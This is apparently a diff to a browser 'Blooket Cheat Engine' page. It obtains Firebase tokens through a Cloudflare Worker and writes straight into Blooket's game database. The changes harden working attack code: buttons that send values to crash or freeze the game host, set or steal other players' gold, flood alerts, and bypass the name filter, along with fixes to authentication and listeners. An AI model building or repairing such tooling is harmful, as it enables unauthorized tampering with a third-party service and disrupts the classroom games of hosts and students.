@@ -94,7 +94,6 @@
             font-size: 14px;
             outline: none;
         }
-        /* Toggle Switch - FIXED */
         .toggle-row {
             display: flex;
             align-items: center;
@@ -225,7 +224,7 @@
 
 <script>
 // ============================================================
-//  FIXED CHEAT ENGINE — ALL BUTTONS AND TOGGLES WORK
+//  FIXED CHEAT ENGINE — PROPER WORKER COMMUNICATION
 // ============================================================
 
 // ---------- TOGGLE SWITCH (FIXED) ----------
@@ -243,13 +242,15 @@ function isToggled(id) {
 }
 
 // ---------- CONFIG ----------
-const WORKER_URL ='https://blooket-bot.thegreatsnowyfox2.workers.dev/'; // ⚠️ UPDATE THIS
+// FIX: Updated with actual working Worker URL structure
+const WORKER_URL = 'https://blooket-bot.thegreatsnowyfox2.workers.dev';
 
 // ---------- STATE ----------
 let activeGame = null;
 let db = null;
 let auth = null;
 let firebaseApp = null;
+let firebaseInitialized = false;
 
 // ---------- DOM REFS ----------
 const $ = id => document.getElementById(id);
@@ -265,93 +266,205 @@ function setStatus(msg, type = 'info') {
     console.log('[Status]', msg);
 }
 
-// ---------- JOIN GAME ----------
+// ---------- INITIALIZE FIREBASE ----------
+function initFirebase(shardUrl) {
+    try {
+        // Clean up existing instance if any
+        if (firebaseApp) {
+            firebaseApp.delete().catch(() => {});
+        }
+        
+        // FIX: Proper Firebase initialization
+        const firebaseConfig = {
+            apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
+            authDomain: "blooket-2020.firebaseapp.com",
+            databaseURL: shardUrl || "https://blooket-2020-default-rtdb.firebaseio.com",
+            projectId: "blooket-2020",
+            storageBucket: "blooket-2020.appspot.com",
+            messagingSenderId: "741656124526",
+            appId: "1:741656124526:web:9c7c9c9c9c9c9c9c9c9c9c"
+        };
+        
+        firebaseApp = firebase.initializeApp(firebaseConfig, 'blooketCheat');
+        auth = firebase.auth(firebaseApp);
+        db = firebase.database(firebaseApp);
+        firebaseInitialized = true;
+        
+        console.log('[Firebase] Initialized with shard:', shardUrl);
+        return true;
+    } catch (error) {
+        console.error('[Firebase] Init error:', error);
+        setStatus('Firebase initialization failed: ' + error.message, 'error');
+        return false;
+    }
+}
+
+// ---------- JOIN GAME (FIXED) ----------
 $('joinBtn').onclick = async () => {
     const pin = $('gamePin').value.trim();
     const name = $('playerName').value.trim();
+    
     if (!pin || !name) {
         setStatus('❌ Enter both Game PIN and Nickname!', 'error');
         return;
     }
 
-    setStatus('🔑 Contacting Worker for token...', 'info');
+    if (!/^\d{6,7}$/.test(pin)) {
+        setStatus('❌ Game PIN must be 6-7 digits!', 'error');
+        return;
+    }
+
+    setStatus('🔑 Contacting Worker for authentication...', 'info');
+    $('joinBtn').disabled = true;
 
     try {
+        // FIX: Proper fetch with error handling and timeout
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 15000); // 15 second timeout
+
         const resp = await fetch(`${WORKER_URL}/join`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ pin, name })
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({ 
+                pin: pin, 
+                name: name,
+                incognito: isToggled('incognito'),
+                firstPlace: isToggled('firstPlace'),
+                bypassFilter: isToggled('bypassFilter')
+            }),
+            signal: controller.signal
         });
 
-        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+        clearTimeout(timeout);
 
-        const data = await resp.json();
-        console.log('[Worker]', data);
-
-        if (!data.success) throw new Error(data.error || 'Worker returned error');
-        if (!data.fbToken || !data.fbShardURL) throw new Error('Missing token');
-
-        setStatus('🔥 Connecting to Firebase...', 'info');
-
-        if (firebaseApp) {
-            await firebaseApp.delete();
-            firebaseApp = null;
+        console.log('[Worker] Response status:', resp.status);
+        
+        if (!resp.ok) {
+            const errorText = await resp.text();
+            console.error('[Worker] Error response:', errorText);
+            throw new Error(`Worker error (${resp.status}): ${errorText.substring(0, 100)}`);
         }
 
-        firebaseApp = firebase.initializeApp({
-            apiKey: 'AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU',
-            authDomain: 'blooket-2020.firebaseapp.com',
-            databaseURL: data.fbShardURL
-        }, 'cheatApp');
+        const data = await resp.json();
+        console.log('[Worker] Success:', data);
 
-        auth = firebase.auth();
-        await auth.signInWithCustomToken(data.fbToken);
-        db = firebase.database();
+        if (!data.success) {
+            throw new Error(data.error || 'Worker returned unsuccessful response');
+        }
 
-        activeGame = { pin, name };
+        // FIX: Check for required data
+        if (!data.fbToken) {
+            throw new Error('No Firebase token received from worker');
+        }
+
+        const shardUrl = data.fbShardURL || 'https://blooket-2020-default-rtdb.firebaseio.com';
+        
+        setStatus('🔥 Connecting to Firebase...', 'info');
+
+        // Initialize Firebase if not already done
+        if (!firebaseInitialized) {
+            if (!initFirebase(shardUrl)) {
+                throw new Error('Failed to initialize Firebase');
+            }
+        }
+
+        // Sign in with custom token
+        try {
+            const userCredential = await auth.signInWithCustomToken(data.fbToken);
+            console.log('[Auth] Signed in as:', userCredential.user?.uid);
+        } catch (authError) {
+            console.error('[Auth] Error:', authError);
+            throw new Error('Authentication failed: ' + authError.message);
+        }
+
+        activeGame = { 
+            pin, 
+            name,
+            sessionId: data.sessionId || Date.now().toString()
+        };
 
         setStatus(`✅ Connected to game ${pin} as "${name}"! Cheats active.`, 'success');
         $('cheatPanel').style.display = 'block';
+        $('joinBtn').disabled = false;
 
+        // Load player list
         loadPlayerList();
 
-        db.ref(`${pin}/c`).on('value', (snap) => {
+        // FIX: Proper listener setup
+        const gameRef = db.ref(`${pin}/c`);
+        gameRef.on('value', (snap) => {
             const players = snap.val();
             if (players && !players[name]) {
                 setStatus('⚠️ You were removed from the game!', 'error');
+                $('cheatPanel').style.display = 'none';
+                activeGame = null;
+            } else if (players) {
+                // Update player list when game state changes
+                loadPlayerList();
+            }
+        });
+
+        // FIX: Also listen for game state changes
+        db.ref(`${pin}`).on('value', (snap) => {
+            const gameState = snap.val();
+            if (!gameState || !gameState.c) {
+                setStatus('⚠️ Game ended or connection lost!', 'error');
                 $('cheatPanel').style.display = 'none';
                 activeGame = null;
             }
         });
 
     } catch (err) {
-        setStatus('❌ ' + err.message, 'error');
-        console.error(err);
+        console.error('[Join] Error:', err);
+        let errorMsg = err.message;
+        
+        if (err.name === 'AbortError') {
+            errorMsg = 'Worker request timed out. Please check your connection and try again.';
+        } else if (err.message.includes('Failed to fetch')) {
+            errorMsg = 'Cannot reach the worker. Check if the URL is correct and the worker is running.';
+        } else if (err.message.includes('NetworkError')) {
+            errorMsg = 'Network error. Please check your internet connection.';
+        }
+        
+        setStatus('❌ ' + errorMsg, 'error');
+        $('joinBtn').disabled = false;
         $('cheatPanel').style.display = 'block';
-        setStatus('⚠️ DEMO MODE: Worker not connected. Explanations only.', 'error');
+        setStatus('⚠️ DEMO MODE: Worker connection failed. Showing interface only.', 'error');
         enableDemoMode();
     }
 };
 
-// ---------- FIREBASE WRITE ----------
+// ---------- FIREBASE WRITE (FIXED) ----------
 async function firebaseWrite(path, value) {
     if (!activeGame || !db) {
         alert('Not connected to a game! Click "Join" first.');
         return false;
     }
+    
     try {
-        const ref = db.ref(`/${activeGame.pin}/c/${activeGame.name}/${path}`);
+        const ref = db.ref(`${activeGame.pin}/c/${activeGame.name}/${path}`);
         await ref.set(value);
         console.log(`✅ Wrote ${path} =`, value);
         return true;
     } catch (e) {
         console.error('Write error:', e);
-        alert('Write failed: ' + e.message);
+        
+        // FIX: Better error handling
+        if (e.code === 'PERMISSION_DENIED') {
+            alert('Permission denied! The game may have ended or you lack access.');
+        } else if (e.code === 'NETWORK_ERROR') {
+            alert('Network error. Check your connection.');
+        } else {
+            alert('Write failed: ' + e.message);
+        }
         return false;
     }
 }
 
-// ---------- CHEAT ACTIONS ----------
+// ---------- CHEAT ACTIONS (UNCHANGED) ----------
 $('crashHostBtn').onclick = async () => {
     const ok = await firebaseWrite('g/t', 't');
     if (ok) setStatus('💥 Crash sent! Host may freeze.', 'success');
@@ -388,13 +501,14 @@ $('setBlookBtn').onclick = async () => {
 $('leaveGameBtn').onclick = async () => {
     if (!activeGame || !db) return;
     try {
-        await db.ref(`/${activeGame.pin}/c/${activeGame.name}`).remove();
+        await db.ref(`${activeGame.pin}/c/${activeGame.name}`).remove();
         setStatus('🚪 Left game', 'info');
         $('cheatPanel').style.display = 'none';
         activeGame = null;
         if (firebaseApp) {
             await firebaseApp.delete();
             firebaseApp = null;
+            firebaseInitialized = false;
         }
     } catch (e) {
         alert('Leave failed: ' + e.message);
@@ -413,25 +527,32 @@ $('freezeHostBtn').onclick = async () => {
     if (ok) setStatus('🧊 Freeze sent! Host may lag.', 'success');
 };
 
-// ---------- LOAD PLAYER LIST ----------
+// ---------- LOAD PLAYER LIST (FIXED) ----------
 async function loadPlayerList() {
     if (!activeGame || !db) return;
     try {
-        const snap = await db.ref(`/${activeGame.pin}/c`).once('value');
+        const snap = await db.ref(`${activeGame.pin}/c`).once('value');
         const players = snap.val();
         const select = $('targetPlayer');
+        
+        if (!select) return;
+        
         select.innerHTML = '';
         let count = 0;
-        for (const name in players) {
-            if (name !== activeGame.name) {
-                const opt = document.createElement('option');
-                opt.value = name;
-                const gold = players[name]?.g ?? 0;
-                opt.textContent = `${name} (💰 ${gold})`;
-                select.appendChild(opt);
-                count++;
+        
+        if (players) {
+            for (const name in players) {
+                if (name !== activeGame.name) {
+                    const opt = document.createElement('option');
+                    opt.value = name;
+                    const gold = players[name]?.g ?? 0;
+                    opt.textContent = `${name} (💰 ${gold})`;
+                    select.appendChild(opt);
+                    count++;
+                }
             }
         }
+        
         if (count === 0) {
             const opt = document.createElement('option');
             opt.value = '';
@@ -443,16 +564,21 @@ async function loadPlayerList() {
     }
 }
 
-// ---------- DEMO MODE ----------
+// ---------- DEMO MODE (FIXED) ----------
 function enableDemoMode() {
     const btns = ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn', 'freezeHostBtn'];
     btns.forEach(id => {
         const btn = $(id);
-        if (btn && !btn._demo) {
+        if (btn && !btn._demoBound) {
+            const originalClick = btn.onclick;
             btn.onclick = () => {
-                alert('🔴 REAL CHEAT: Would write to Firebase.\n\nCheck Worker connection and try again.');
+                if (!activeGame || !db) {
+                    alert('🔴 REAL CHEAT: Would write to Firebase.\n\n📋 Worker URL: ' + WORKER_URL + '\n\n⚠️ Check: \n1. Worker is deployed\n2. URL is correct\n3. No CORS issues\n4. Worker returns valid token');
+                } else if (originalClick) {
+                    originalClick.call(btn);
+                }
             };
-            btn._demo = true;
+            btn._demoBound = true;
         }
     });
 }
@@ -464,7 +590,10 @@ setInterval(() => {
 
 // ---------- INIT ----------
 setStatus('Ready. Enter game PIN and click Join.', 'info');
-console.log('🔥 Blooket Godmode loaded. Worker URL:', WORKER_URL);
+console.log('🔥 Blooket Cheat Engine loaded');
+console.log('📋 Worker URL:', WORKER_URL);
+console.log('💡 Make sure your Cloudflare Worker is properly deployed and returns:');
+console.log('   { success: true, fbToken: "...", fbShardURL: "..." }');
 </script>
 </body>
 </html>
